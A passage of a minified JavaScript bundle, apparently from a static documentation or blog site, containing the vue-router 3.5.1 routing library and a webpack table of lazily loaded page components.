u[l]=null,s();u[l]={component:v},o.registerRouteInstance=function(e,t){var n=m.instances[l];(t&&n!==e||!t&&n===e)&&(m.instances[l]=t)},(o.hook||(o.hook={})).prepatch=function(e,t){m.instances[l]=t.componentInstance},o.hook.init=function(e){e.data.keepAlive&&e.componentInstance&&e.componentInstance!==m.instances[l]&&(m.instances[l]=e.componentInstance),S(c)};var b=m.props&&m.props[l];return b&&(i(u[l],{route:c,configProps:b}),T(v,o,c,b)),s(v,o,r)}};function T(e,t,n,r){var a=t.props=function(e,t){switch(typeof t){case"undefined":return;case"object":return t;case"function":return t(e);case"boolean":return t?e.params:void 0;default:0}}(n,r);if(a){a=t.props=i({},a);var o=t.attrs=t.attrs||{};for(var s in a)e.props&&s in e.props||(o[s]=a[s],delete a[s])}}function j(e,t,n){var r=e.charAt(0);if("/"===r)return e;if("?"===r||"#"===r)return t+e;var a=t.split("/");n&&a[a.length-1]||a.pop();for(var o=e.replace(/^\//,"").split("/"),i=0;i<o.length;i++){var s=o[i];".."===s?a.pop():"."!==s&&a.push(s)}return""!==a[0]&&a.unshift(""),a.join("/")}function P(e){return e.replace(/\/\//g,"/")}var C=Array.isArray||function(e){return"[object Array]"==Object.prototype.toString.call(e)},E=q,A=R,O=function(e,t){return N(R(e,t),t)},I=N,L=H,M=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function R(e,t){for(var n,r=[],a=0,o=0,i="",s=t&&t.delimiter||"/";null!=(n=M.exec(e));){var l=n[0],c=n[1],u=n.index;if(i+=e.slice(o,u),o=u+l.length,c)i+=c[1];else{var p=e[o],d=n[2],g=n[3],h=n[4],f=n[5],m=n[6],v=n[7];i&&(r.push(i),i="");var b=null!=d&&null!=p&&p!==d,y="+"===m||"*"===m,x="?"===m||"*"===m,k=n[2]||s,w=h||f;r.push({name:g||a++,prefix:d||"",delimiter:k,optional:x,repeat:y,partial:b,asterisk:!!v,pattern:w?F(w):v?".*":"[^"+$(k)+"]+?"})}}return o<e.length&&(i+=e.substr(o)),i&&r.push(i),r}function D(e){return encodeURI(e).replace(/[\/?#]/g,(function(e){return"%"+e.charCodeAt(0).toString(16).toUpperCase()}))}function N(e,t){for(var n=new Array(e.length),r=0;r<e.length;r++)"object"==typeof e[r]&&(n[r]=new RegExp("^(?:"+e[r].pattern+")$",B(t)));return function(t,r){for(var a="",o=t||{},i=(r||{}).pretty?D:encodeURIComponent,s=0;s<e.length;s++){var l=e[s];if("string"!=typeof l){var c,u=o[l.name];if(null==u){if(l.optional){l.partial&&(a+=l.prefix);continue}throw new TypeError('Expected "'+l.name+'" to be defined')}if(C(u)){if(!l.repeat)throw new TypeError('Expected "'+l.name+'" to not repeat, but received `'+JSON.stringify(u)+"`");if(0===u.length){if(l.optional)continue;throw new TypeError('Expected "'+l.name+'" to not be empty')}for(var p=0;p<u.length;p++){if(c=i(u[p]),!n[s].test(c))throw new TypeError('Expected all "'+l.name+'" to match "'+l.pattern+'", but received `'+JSON.stringify(c)+"`");a+=(0===p?l.prefix:l.delimiter)+c}}else{if(c=l.asterisk?encodeURI(u).replace(/[?#]/g,(function(e){return"%"+e.charCodeAt(0).toString(16).toUpperCase()})):i(u),!n[s].test(c))throw new TypeError('Expected "'+l.name+'" to match "'+l.pattern+'", but received "'+c+'"');a+=l.prefix+c}}else a+=l}return a}}function $(e){return e.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function F(e){return e.replace(/([=!:$\/()])/g,"\\$1")}function U(e,t){return e.keys=t,e}function B(e){return e&&e.sensitive?"":"i"}function H(e,t,n){C(t)||(n=t||n,t=[]);for(var r=(n=n||{}).strict,a=!1!==n.end,o="",i=0;i<e.length;i++){var s=e[i];if("string"==typeof s)o+=$(s);else{var l=$(s.prefix),c="(?:"+s.pattern+")";t.push(s),s.repeat&&(c+="(?:"+l+c+")*"),o+=c=s.optional?s.partial?l+"("+c+")?":"(?:"+l+"("+c+"))?":l+"("+c+")"}}var u=$(n.delimiter||"/"),p=o.slice(-u.length)===u;return r||(o=(p?o.slice(0,-u.length):o)+"(?:"+u+"(?=$))?"),o+=a?"$":r&&p?"":"(?="+u+"|$)",U(new RegExp("^"+o,B(n)),t)}function q(e,t,n){return C(t)||(n=t||n,t=[]),n=n||{},e instanceof RegExp?function(e,t){var n=e.source.match(/\((?!\?)/g);if(n)for(var r=0;r<n.length;r++)t.push({name:r,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return U(e,t)}(e,t):C(e)?function(e,t,n){for(var r=[],a=0;a<e.length;a++)r.push(q(e[a],t,n).source);return U(new RegExp("(?:"+r.join("|")+")",B(n)),t)}(e,t,n):function(e,t,n){return H(R(e,n),t,n)}(e,t,n)}E.parse=A,E.compile=O,E.tokensToFunction=I,E.tokensToRegExp=L;var z=Object.create(null);function J(e,t,n){t=t||{};try{var r=z[e]||(z[e]=E.compile(e));return"string"==typeof t.pathMatch&&(t[0]=t.pathMatch),r(t,{pretty:!0})}catch(e){return""}finally{delete t[0]}}function V(e,t,n,r){var a="string"==typeof e?{path:e}:e;if(a._normalized)return a;if(a.name){var o=(a=i({},e)).params;return o&&"object"==typeof o&&(a.params=i({},o)),a}if(!a.path&&a.params&&t){(a=i({},a))._normalized=!0;var s=i(i({},t.params),a.params);if(t.name)a.name=t.name,a.params=s;else if(t.matched.length){var l=t.matched[t.matched.length-1].path;a.path=J(l,s,t.path)}else 0;return a}var c=function(e){var t="",n="",r=e.indexOf("#");r>=0&&(t=e.slice(r),e=e.slice(0,r));var a=e.indexOf("?");return a>=0&&(n=e.slice(a+1),e=e.slice(0,a)),{path:e,query:n,hash:t}}(a.path||""),u=t&&t.path||"/",p=c.path?j(c.path,u,n||a.append):u,h=function(e,t,n){void 0===t&&(t={});var r,a=n||g;try{r=a(e||"")}catch(e){r={}}for(var o in t){var i=t[o];r[o]=Array.isArray(i)?i.map(d):d(i)}return r}(c.query,a.query,r&&r.options.parseQuery),f=a.hash||c.hash;return f&&"#"!==f.charAt(0)&&(f="#"+f),{_normalized:!0,path:p,query:h,hash:f}}var W,K=function(){},G={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},custom:Boolean,exact:Boolean,exactPath:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(e){var t=this,n=this.$router,r=this.$route,a=n.resolve(this.to,r,this.append),o=a.location,s=a.route,l=a.href,c={},u=n.options.linkActiveClass,p=n.options.linkExactActiveClass,d=null==u?"router-link-active":u,g=null==p?"router-link-exact-active":p,h=null==this.activeClass?d:this.activeClass,v=null==this.exactActiveClass?g:this.exactActiveClass,b=s.redirectedFrom?m(null,V(s.redirectedFrom),null,n):s;c[v]=k(r,b,this.exactPath),c[h]=this.exact||this.exactPath?c[v]:function(e,t){return 0===e.path.replace(f,"/").indexOf(t.path.replace(f,"/"))&&(!t.hash||e.hash===t.hash)&&function(e,t){for(var n in t)if(!(n in e))return!1;return!0}(e.query,t.query)}(r,b);var y=c[v]?this.ariaCurrentValue:null,x=function(e){Q(e)&&(t.replace?n.replace(o,K):n.push(o,K))},w={click:Q};Array.isArray(this.event)?this.event.forEach((function(e){w[e]=x})):w[this.event]=x;var S={class:c},_=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:l,route:s,navigate:x,isActive:c[h],isExactActive:c[v]});if(_){if(1===_.length)return _[0];if(_.length>1||!_.length)return 0===_.length?e():e("span",{},_)}if("a"===this.tag)S.on=w,S.attrs={href:l,"aria-current":y};else{var T=function e(t){var n;if(t)for(var r=0;r<t.length;r++){if("a"===(n=t[r]).tag)return n;if(n.children&&(n=e(n.children)))return n}}(this.$slots.default);if(T){T.isStatic=!1;var j=T.data=i({},T.data);for(var P in j.on=j.on||{},j.on){var C=j.on[P];P in w&&(j.on[P]=Array.isArray(C)?C:[C])}for(var E in w)E in j.on?j.on[E].push(w[E]):j.on[E]=x;var A=T.data.attrs=i({},T.data.attrs);A.href=l,A["aria-current"]=y}else S.on=w}return e(this.tag,S,this.$slots.default)}};function Q(e){if(!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey||e.defaultPrevented||void 0!==e.button&&0!==e.button)){if(e.currentTarget&&e.currentTarget.getAttribute){var t=e.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(t))return}return e.preventDefault&&e.preventDefault(),!0}}var Z="undefined"!=typeof window;function Y(e,t,n,r,a){var o=t||[],i=n||Object.create(null),s=r||Object.create(null);e.forEach((function(e){!function e(t,n,r,a,o,i){var s=a.path,l=a.name;0;var c=a.pathToRegexpOptions||{},u=function(e,t,n){n||(e=e.replace(/\/$/,""));if("/"===e[0])return e;if(null==t)return e;return P(t.path+"/"+e)}(s,o,c.strict);"boolean"==typeof a.caseSensitive&&(c.sensitive=a.caseSensitive);var p={path:u,regex:X(u,c),components:a.components||{default:a.component},alias:a.alias?"string"==typeof a.alias?[a.alias]:a.alias:[],instances:{},enteredCbs:{},name:l,parent:o,matchAs:i,redirect:a.redirect,beforeEnter:a.beforeEnter,meta:a.meta||{},props:null==a.props?{}:a.components?a.props:{default:a.props}};a.children&&a.children.forEach((function(a){var o=i?P(i+"/"+a.path):void 0;e(t,n,r,a,p,o)}));n[p.path]||(t.push(p.path),n[p.path]=p);if(void 0!==a.alias)for(var d=Array.isArray(a.alias)?a.alias:[a.alias],g=0;g<d.length;++g){0;var h={path:d[g],children:a.children};e(t,n,r,h,o,p.path||"/")}l&&(r[l]||(r[l]=p))}(o,i,s,e,a)}));for(var l=0,c=o.length;l<c;l++)"*"===o[l]&&(o.push(o.splice(l,1)[0]),c--,l--);return{pathList:o,pathMap:i,nameMap:s}}function X(e,t){return E(e,[],t)}function ee(e,t){var n=Y(e),r=n.pathList,a=n.pathMap,o=n.nameMap;function i(e,n,i){var s=V(e,n,!1,t),c=s.name;if(c){var u=o[c];if(!u)return l(null,s);var p=u.regex.keys.filter((function(e){return!e.optional})).map((function(e){return e.name}));if("object"!=typeof s.params&&(s.params={}),n&&"object"==typeof n.params)for(var d in n.params)!(d in s.params)&&p.indexOf(d)>-1&&(s.params[d]=n.params[d]);return s.path=J(u.path,s.params),l(u,s,i)}if(s.path){s.params={};for(var g=0;g<r.length;g++){var h=r[g],f=a[h];if(te(f.regex,s.path,s.params))return l(f,s,i)}}return l(null,s)}function s(e,n){var r=e.redirect,a="function"==typeof r?r(m(e,n,null,t)):r;if("string"==typeof a&&(a={path:a}),!a||"object"!=typeof a)return l(null,n);var s=a,c=s.name,u=s.path,p=n.query,d=n.hash,g=n.params;if(p=s.hasOwnProperty("query")?s.query:p,d=s.hasOwnProperty("hash")?s.hash:d,g=s.hasOwnProperty("params")?s.params:g,c){o[c];return i({_normalized:!0,name:c,query:p,hash:d,params:g},void 0,n)}if(u){var h=function(e,t){return j(e,t.parent?t.parent.path:"/",!0)}(u,e);return i({_normalized:!0,path:J(h,g),query:p,hash:d},void 0,n)}return l(null,n)}function l(e,n,r){return e&&e.redirect?s(e,r||n):e&&e.matchAs?function(e,t,n){var r=i({_normalized:!0,path:J(n,t.params)});if(r){var a=r.matched,o=a[a.length-1];return t.params=r.params,l(o,t)}return l(null,t)}(0,n,e.matchAs):m(e,n,r,t)}return{match:i,addRoute:function(e,t){var n="object"!=typeof e?o[e]:void 0;Y([t||e],r,a,o,n),n&&Y(n.alias.map((function(e){return{path:e,children:[t]}})),r,a,o,n)},getRoutes:function(){return r.map((function(e){return a[e]}))},addRoutes:function(e){Y(e,r,a,o)}}}function te(e,t,n){var r=t.match(e);if(!r)return!1;if(!n)return!0;for(var a=1,o=r.length;a<o;++a){var i=e.keys[a-1];i&&(n[i.name||"pathMatch"]="string"==typeof r[a]?p(r[a]):r[a])}return!0}var ne=Z&&window.performance&&window.performance.now?window.performance:Date;function re(){return ne.now().toFixed(3)}var ae=re();function oe(){return ae}function ie(e){return ae=e}var se=Object.create(null);function le(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var e=window.location.protocol+"//"+window.location.host,t=window.location.href.replace(e,""),n=i({},window.history.state);return n.key=oe(),window.history.replaceState(n,"",t),window.addEventListener("popstate",pe),function(){window.removeEventListener("popstate",pe)}}function ce(e,t,n,r){if(e.app){var a=e.options.scrollBehavior;a&&e.app.$nextTick((function(){var o=function(){var e=oe();if(e)return se[e]}(),i=a.call(e,t,n,r?o:null);i&&("function"==typeof i.then?i.then((function(e){me(e,o)})).catch((function(e){0})):me(i,o))}))}}function ue(){var e=oe();e&&(se[e]={x:window.pageXOffset,y:window.pageYOffset})}function pe(e){ue(),e.state&&e.state.key&&ie(e.state.key)}function de(e){return he(e.x)||he(e.y)}function ge(e){return{x:he(e.x)?e.x:window.pageXOffset,y:he(e.y)?e.y:window.pageYOffset}}function he(e){return"number"==typeof e}var fe=/^#\d/;function me(e,t){var n,r="object"==typeof e;if(r&&"string"==typeof e.selector){var a=fe.test(e.selector)?document.getElementById(e.selector.slice(1)):document.querySelector(e.selector);if(a){var o=e.offset&&"object"==typeof e.offset?e.offset:{};t=function(e,t){var n=document.documentElement.getBoundingClientRect(),r=e.getBoundingClientRect();return{x:r.left-n.left-t.x,y:r.top-n.top-t.y}}(a,o={x:he((n=o).x)?n.x:0,y:he(n.y)?n.y:0})}else de(e)&&(t=ge(e))}else r&&de(e)&&(t=ge(e));t&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:t.x,top:t.y,behavior:e.behavior}):window.scrollTo(t.x,t.y))}var ve,be=Z&&((-1===(ve=window.navigator.userAgent).indexOf("Android 2.")&&-1===ve.indexOf("Android 4.0")||-1===ve.indexOf("Mobile Safari")||-1!==ve.indexOf("Chrome")||-1!==ve.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function ye(e,t){ue();var n=window.history;try{if(t){var r=i({},n.state);r.key=oe(),n.replaceState(r,"",e)}else n.pushState({key:ie(re())},"",e)}catch(n){window.location[t?"replace":"assign"](e)}}function xe(e){ye(e,!0)}function ke(e,t,n){var r=function(a){a>=e.length?n():e[a]?t(e[a],(function(){r(a+1)})):r(a+1)};r(0)}var we={redirected:2,aborted:4,cancelled:8,duplicated:16};function Se(e,t){return Te(e,t,we.redirected,'Redirected when going from "'+e.fullPath+'" to "'+function(e){if("string"==typeof e)return e;if("path"in e)return e.path;var t={};return je.forEach((function(n){n in e&&(t[n]=e[n])})),JSON.stringify(t,null,2)}(t)+'" via a navigation guard.')}function _e(e,t){return Te(e,t,we.cancelled,'Navigation cancelled from "'+e.fullPath+'" to "'+t.fullPath+'" with a new navigation.')}function Te(e,t,n,r){var a=new Error(r);return a._isRouter=!0,a.from=e,a.to=t,a.type=n,a}var je=["params","query","hash"];function Pe(e){return Object.prototype.toString.call(e).indexOf("Error")>-1}function Ce(e,t){return Pe(e)&&e._isRouter&&(null==t||e.type===t)}function Ee(e){return function(t,n,r){var a=!1,o=0,i=null;Ae(e,(function(e,t,n,s){if("function"==typeof e&&void 0===e.cid){a=!0,o++;var l,c=Le((function(t){var a;((a=t).__esModule||Ie&&"Module"===a[Symbol.toStringTag])&&(t=t.default),e.resolved="function"==typeof t?t:W.extend(t),n.components[s]=t,--o<=0&&r()})),u=Le((function(e){var t="Failed to resolve async component "+s+": "+e;i||(i=Pe(e)?e:new Error(t),r(i))}));try{l=e(c,u)}catch(e){u(e)}if(l)if("function"==typeof l.then)l.then(c,u);else{var p=l.component;p&&"function"==typeof p.then&&p.then(c,u)}}})),a||r()}}function Ae(e,t){return Oe(e.map((function(e){return Object.keys(e.components).map((function(n){return t(e.components[n],e.instances[n],e,n)}))})))}function Oe(e){return Array.prototype.concat.apply([],e)}var Ie="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function Le(e){var t=!1;return function(){for(var n=[],r=arguments.length;r--;)n[r]=arguments[r];if(!t)return t=!0,e.apply(this,n)}}var Me=function(e,t){this.router=e,this.base=function(e){if(!e)if(Z){var t=document.querySelector("base");e=(e=t&&t.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else e="/";"/"!==e.charAt(0)&&(e="/"+e);return e.replace(/\/$/,"")}(t),this.current=b,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function Re(e,t,n,r){var a=Ae(e,(function(e,r,a,o){var i=function(e,t){"function"!=typeof e&&(e=W.extend(e));return e.options[t]}(e,t);if(i)return Array.isArray(i)?i.map((function(e){return n(e,r,a,o)})):n(i,r,a,o)}));return Oe(r?a.reverse():a)}function De(e,t){if(t)return function(){return e.apply(t,arguments)}}Me.prototype.listen=function(e){this.cb=e},Me.prototype.onReady=function(e,t){this.ready?e():(this.readyCbs.push(e),t&&this.readyErrorCbs.push(t))},Me.prototype.onError=function(e){this.errorCbs.push(e)},Me.prototype.transitionTo=function(e,t,n){var r,a=this;try{r=this.router.match(e,this.current)}catch(e){throw this.errorCbs.forEach((function(t){t(e)})),e}var o=this.current;this.confirmTransition(r,(function(){a.updateRoute(r),t&&t(r),a.ensureURL(),a.router.afterHooks.forEach((function(e){e&&e(r,o)})),a.ready||(a.ready=!0,a.readyCbs.forEach((function(e){e(r)})))}),(function(e){n&&n(e),e&&!a.ready&&(Ce(e,we.redirected)&&o===b||(a.ready=!0,a.readyErrorCbs.forEach((function(t){t(e)}))))}))},Me.prototype.confirmTransition=function(e,t,n){var r=this,a=this.current;this.pending=e;var o=function(e){!Ce(e)&&Pe(e)&&(r.errorCbs.length?r.errorCbs.forEach((function(t){t(e)})):console.error(e)),n&&n(e)},i=e.matched.length-1,s=a.matched.length-1;if(k(e,a)&&i===s&&e.matched[i]===a.matched[s])return this.ensureURL(),o(function(e,t){var n=Te(e,t,we.duplicated,'Avoided redundant navigation to current location: "'+e.fullPath+'".');return n.name="NavigationDuplicated",n}(a,e));var l=function(e,t){var n,r=Math.max(e.length,t.length);for(n=0;n<r&&e[n]===t[n];n++);return{updated:t.slice(0,n),activated:t.slice(n),deactivated:e.slice(n)}}(this.current.matched,e.matched),c=l.updated,u=l.deactivated,p=l.activated,d=[].concat(function(e){return Re(e,"beforeRouteLeave",De,!0)}(u),this.router.beforeHooks,function(e){return Re(e,"beforeRouteUpdate",De)}(c),p.map((function(e){return e.beforeEnter})),Ee(p)),g=function(t,n){if(r.pending!==e)return o(_e(a,e));try{t(e,a,(function(t){!1===t?(r.ensureURL(!0),o(function(e,t){return Te(e,t,we.aborted,'Navigation aborted from "'+e.fullPath+'" to "'+t.fullPath+'" via a navigation guard.')}(a,e))):Pe(t)?(r.ensureURL(!0),o(t)):"string"==typeof t||"object"==typeof t&&("string"==typeof t.path||"string"==typeof t.name)?(o(Se(a,e)),"object"==typeof t&&t.replace?r.replace(t):r.push(t)):n(t)}))}catch(e){o(e)}};ke(d,g,(function(){ke(function(e){return Re(e,"beforeRouteEnter",(function(e,t,n,r){return function(e,t,n){return function(r,a,o){return e(r,a,(function(e){"function"==typeof e&&(t.enteredCbs[n]||(t.enteredCbs[n]=[]),t.enteredCbs[n].push(e)),o(e)}))}}(e,n,r)}))}(p).concat(r.router.resolveHooks),g,(function(){if(r.pending!==e)return o(_e(a,e));r.pending=null,t(e),r.router.app&&r.router.app.$nextTick((function(){S(e)}))}))}))},Me.prototype.updateRoute=function(e){this.current=e,this.cb&&this.cb(e)},Me.prototype.setupListeners=function(){},Me.prototype.teardown=function(){this.listeners.forEach((function(e){e()})),this.listeners=[],this.current=b,this.pending=null};var Ne=function(e){function t(t,n){e.call(this,t,n),this._startLocation=$e(this.base)}return e&&(t.__proto__=e),t.prototype=Object.create(e&&e.prototype),t.prototype.constructor=t,t.prototype.setupListeners=function(){var e=this;if(!(this.listeners.length>0)){var t=this.router,n=t.options.scrollBehavior,r=be&&n;r&&this.listeners.push(le());var a=function(){var n=e.current,a=$e(e.base);e.current===b&&a===e._startLocation||e.transitionTo(a,(function(e){r&&ce(t,e,n,!0)}))};window.addEventListener("popstate",a),this.listeners.push((function(){window.removeEventListener("popstate",a)}))}},t.prototype.go=function(e){window.history.go(e)},t.prototype.push=function(e,t,n){var r=this,a=this.current;this.transitionTo(e,(function(e){ye(P(r.base+e.fullPath)),ce(r.router,e,a,!1),t&&t(e)}),n)},t.prototype.replace=function(e,t,n){var r=this,a=this.current;this.transitionTo(e,(function(e){xe(P(r.base+e.fullPath)),ce(r.router,e,a,!1),t&&t(e)}),n)},t.prototype.ensureURL=function(e){if($e(this.base)!==this.current.fullPath){var t=P(this.base+this.current.fullPath);e?ye(t):xe(t)}},t.prototype.getCurrentLocation=function(){return $e(this.base)},t}(Me);function $e(e){var t=window.location.pathname;return e&&0===t.toLowerCase().indexOf(e.toLowerCase())&&(t=t.slice(e.length)),(t||"/")+window.location.search+window.location.hash}var Fe=function(e){function t(t,n,r){e.call(this,t,n),r&&function(e){var t=$e(e);if(!/^\/#/.test(t))return window.location.replace(P(e+"/#"+t)),!0}(this.base)||Ue()}return e&&(t.__proto__=e),t.prototype=Object.create(e&&e.prototype),t.prototype.constructor=t,t.prototype.setupListeners=function(){var e=this;if(!(this.listeners.length>0)){var t=this.router.options.scrollBehavior,n=be&&t;n&&this.listeners.push(le());var r=function(){var t=e.current;Ue()&&e.transitionTo(Be(),(function(r){n&&ce(e.router,r,t,!0),be||ze(r.fullPath)}))},a=be?"popstate":"hashchange";window.addEventListener(a,r),this.listeners.push((function(){window.removeEventListener(a,r)}))}},t.prototype.push=function(e,t,n){var r=this,a=this.current;this.transitionTo(e,(function(e){qe(e.fullPath),ce(r.router,e,a,!1),t&&t(e)}),n)},t.prototype.replace=function(e,t,n){var r=this,a=this.current;this.transitionTo(e,(function(e){ze(e.fullPath),ce(r.router,e,a,!1),t&&t(e)}),n)},t.prototype.go=function(e){window.history.go(e)},t.prototype.ensureURL=function(e){var t=this.current.fullPath;Be()!==t&&(e?qe(t):ze(t))},t.prototype.getCurrentLocation=function(){return Be()},t}(Me);function Ue(){var e=Be();return"/"===e.charAt(0)||(ze("/"+e),!1)}function Be(){var e=window.location.href,t=e.indexOf("#");return t<0?"":e=e.slice(t+1)}function He(e){var t=window.location.href,n=t.indexOf("#");return(n>=0?t.slice(0,n):t)+"#"+e}function qe(e){be?ye(He(e)):window.location.hash=e}function ze(e){be?xe(He(e)):window.location.replace(He(e))}var Je=function(e){function t(t,n){e.call(this,t,n),this.stack=[],this.index=-1}return e&&(t.__proto__=e),t.prototype=Object.create(e&&e.prototype),t.prototype.constructor=t,t.prototype.push=function(e,t,n){var r=this;this.transitionTo(e,(function(e){r.stack=r.stack.slice(0,r.index+1).concat(e),r.index++,t&&t(e)}),n)},t.prototype.replace=function(e,t,n){var r=this;this.transitionTo(e,(function(e){r.stack=r.stack.slice(0,r.index).concat(e),t&&t(e)}),n)},t.prototype.go=function(e){var t=this,n=this.index+e;if(!(n<0||n>=this.stack.length)){var r=this.stack[n];this.confirmTransition(r,(function(){var e=t.current;t.index=n,t.updateRoute(r),t.router.afterHooks.forEach((function(t){t&&t(r,e)}))}),(function(e){Ce(e,we.duplicated)&&(t.index=n)}))}},t.prototype.getCurrentLocation=function(){var e=this.stack[this.stack.length-1];return e?e.fullPath:"/"},t.prototype.ensureURL=function(){},t}(Me),Ve=function(e){void 0===e&&(e={}),this.app=null,this.apps=[],this.options=e,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=ee(e.routes||[],this);var t=e.mode||"hash";switch(this.fallback="history"===t&&!be&&!1!==e.fallback,this.fallback&&(t="hash"),Z||(t="abstract"),this.mode=t,t){case"history":this.history=new Ne(this,e.base);break;case"hash":this.history=new Fe(this,e.base,this.fallback);break;case"abstract":this.history=new Je(this,e.base);break;default:0}},We={currentRoute:{configurable:!0}};function Ke(e,t){return e.push(t),function(){var n=e.indexOf(t);n>-1&&e.splice(n,1)}}Ve.prototype.match=function(e,t,n){return this.matcher.match(e,t,n)},We.currentRoute.get=function(){return this.history&&this.history.current},Ve.prototype.init=function(e){var t=this;if(this.apps.push(e),e.$once("hook:destroyed",(function(){var n=t.apps.indexOf(e);n>-1&&t.apps.splice(n,1),t.app===e&&(t.app=t.apps[0]||null),t.app||t.history.teardown()})),!this.app){this.app=e;var n=this.history;if(n instanceof Ne||n instanceof Fe){var r=function(e){n.setupListeners(),function(e){var r=n.current,a=t.options.scrollBehavior;be&&a&&"fullPath"in e&&ce(t,e,r,!1)}(e)};n.transitionTo(n.getCurrentLocation(),r,r)}n.listen((function(e){t.apps.forEach((function(t){t._route=e}))}))}},Ve.prototype.beforeEach=function(e){return Ke(this.beforeHooks,e)},Ve.prototype.beforeResolve=function(e){return Ke(this.resolveHooks,e)},Ve.prototype.afterEach=function(e){return Ke(this.afterHooks,e)},Ve.prototype.onReady=function(e,t){this.history.onReady(e,t)},Ve.prototype.onError=function(e){this.history.onError(e)},Ve.prototype.push=function(e,t,n){var r=this;if(!t&&!n&&"undefined"!=typeof Promise)return new Promise((function(t,n){r.history.push(e,t,n)}));this.history.push(e,t,n)},Ve.prototype.replace=function(e,t,n){var r=this;if(!t&&!n&&"undefined"!=typeof Promise)return new Promise((function(t,n){r.history.replace(e,t,n)}));this.history.replace(e,t,n)},Ve.prototype.go=function(e){this.history.go(e)},Ve.prototype.back=function(){this.go(-1)},Ve.prototype.forward=function(){this.go(1)},Ve.prototype.getMatchedComponents=function(e){var t=e?e.matched?e:this.resolve(e).route:this.currentRoute;return t?[].concat.apply([],t.matched.map((function(e){return Object.keys(e.components).map((function(t){return e.components[t]}))}))):[]},Ve.prototype.resolve=function(e,t,n){var r=V(e,t=t||this.history.current,n,this),a=this.match(r,t),o=a.redirectedFrom||a.fullPath;return{location:r,route:a,href:function(e,t,n){var r="hash"===n?"#"+t:t;return e?P(e+"/"+r):r}(this.history.base,o,this.mode),normalizedTo:r,resolved:a}},Ve.prototype.getRoutes=function(){return this.matcher.getRoutes()},Ve.prototype.addRoute=function(e,t){this.matcher.addRoute(e,t),this.history.current!==b&&this.history.transitionTo(this.history.getCurrentLocation())},Ve.prototype.addRoutes=function(e){this.matcher.addRoutes(e),this.history.current!==b&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(Ve.prototype,We),Ve.install=function e(t){if(!e.installed||W!==t){e.installed=!0,W=t;var n=function(e){return void 0!==e},r=function(e,t){var r=e.$options._parentVnode;n(r)&&n(r=r.data)&&n(r=r.registerRouteInstance)&&r(e,t)};t.mixin({beforeCreate:function(){n(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),t.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,r(this,this)},destroyed:function(){r(this)}}),Object.defineProperty(t.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(t.prototype,"$route",{get:function(){return this._routerRoot._route}}),t.component("RouterView",_),t.component("RouterLink",G);var a=t.config.optionMergeStrategies;a.beforeRouteEnter=a.beforeRouteLeave=a.beforeRouteUpdate=a.created}},Ve.version="3.5.1",Ve.isNavigationFailure=Ce,Ve.NavigationFailureType=we,Ve.START_LOCATION=b,Z&&window.Vue&&window.Vue.use(Ve);var Ge=Ve;n(45),n(132),n(323),n(207),n(208),n(80),n(325),n(46);function Qe(e){e.locales&&Object.keys(e.locales).forEach((function(t){e.locales[t].path=t})),Object.freeze(e)}n(271),n(211),n(35),n(272),n(59),n(91);var Ze=n(34),Ye={NotFound:function(){return Promise.all([n.e(0),n.e(7)]).then(n.bind(null,578))},Category:function(){return Promise.all([n.e(0),n.e(1),n.e(6)]).then(n.bind(null,579))},Layout:function(){return Promise.all([n.e(0),n.e(1),n.e(3)]).then(n.bind(null,577))},Tag:function(){return Promise.all([n.e(0),n.e(1),n.e(4)]).then(n.bind(null,580))},Tags:function(){return Promise.all([n.e(0),n.e(1),n.e(5)]).then(n.bind(null,581))},TimeLines:function(){return Promise.all([n.e(0),n.e(1),n.e(9)]).then(n.bind(null,582))}},Xe={"v-6f173a07":function(){return n.e(11).then(n.bind(null,583))},"v-4a7c8606":function(){return n.e(10).then(n.bind(null,584))},"v-055534f5":function(){return n.e(12).then(n.bind(null,585))},"v-56b06655":function(){return n.e(13).then(n.bind(null,586))},"v-1b370f62":function(){return n.e(14).then(n.bind(null,587))},"v-0127fc35":function(){return n.e(15).then(n.bind(null,588))},"v-7fe11355":function(){return n.e(16).then(n.bind(null,589))},"v-d0fbf362":function(){return n.e(17).then(n.bind(null,590))},"v-73d15695":function(){return n.e(18).then(n.bind(null,591))},"v-39a93e16":function(){return n.e(19).then(n.bind(null,592))},"v-31f6f156":function(){return n.e(20).then(n.bind(null,593))},"v-99aa11d6":function(){return n.e(21).then(n.bind(null,594))},"v-958c3346":function(){return n.e(22).then(n.bind(null,595))},"v-d2366516":function(){return n.e(23).then(n.bind(null,596))},"v-843d7756":function(){return n.e(24).then(n.bind(null,597))},"v-ee437296":function(){return n.e(25).then(n.bind(null,598))},"v-6f1710d5":function(){return n.e(26).then(n.bind(null,599))},"v-3d1e0635":function(){return n.e(27).then(n.bind(null,600))},"v-a966a896":function(){return n.e(28).then(n.bind(null,601))},"v-ba1a4256":function(){return n.e(29).then(n.bind(null,602))},"v-09aa9075":function(){return n.e(30).then(n.bind(null,603))},"v-a1c8fcd6":function(){return n.e(31).then(n.bind(null,604))},"v-6b38fbed":function(){return n.e(32).then(n.bind(null,605))},"v-323679ad":function(){return n.e(33).then(n.bind(null,606))},"v-92059896":function(){return 